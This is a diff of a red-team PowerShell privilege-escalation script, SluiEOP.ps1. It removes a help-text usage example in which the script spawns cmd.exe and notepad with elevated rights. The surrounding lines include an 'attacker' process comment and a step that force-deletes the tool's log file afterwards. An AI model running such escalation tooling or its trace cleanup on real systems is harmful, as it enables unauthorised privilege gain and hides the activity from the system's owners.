@@ -151,18 +151,6 @@ If($CheckVuln -eq $True){
       UserDomain ProccessName Status   PID
       ---------- ------------ ------   ---
       SKYNET     notepad      success  5543
-
-   .EXAMPLE
-      PS C:\> .\SluiEOP.ps1 "C:\Windows\System32\cmd.exe /c start notepad.exe"
-
-      Id           : 0
-      Architecture : AMD64
-      UserDomain   : SKYNET
-      ProcessName  : notepad
-      Status       : success
-      PID          : 54338
-      StartTime    : 05/08/2020 11:41
-      ProcessPath  : C:\Windows\System32\notepad.exe
    #>
 
    ## Extracting attacker Spawned ProcessName PID
@@ -246,7 +234,6 @@ If($CheckVuln -eq $True){
    Write-Host "`nSluiEOP v1.9 - By r00t-3xp10it (SSA RedTeam @2020)" -ForeGroundColor Green
    Write-Host "[ ERROR ] System Doesn't Seems Vulnerable, Aborting ..`n" -ForegroundColor red -BackgroundColor Black
 }
-
 
 ## Clean old files left behind after EOP finished ..
 If(Test-Path "$Env:TMP\sLUIEop.log"){Get-Content -Path "$Env:TMP\sLUIEop.log" -EA SilentlyContinue;Remove-Item -Path "$Env:TMP\sLUIEop.log" -Force -EA SilentlyContinue}
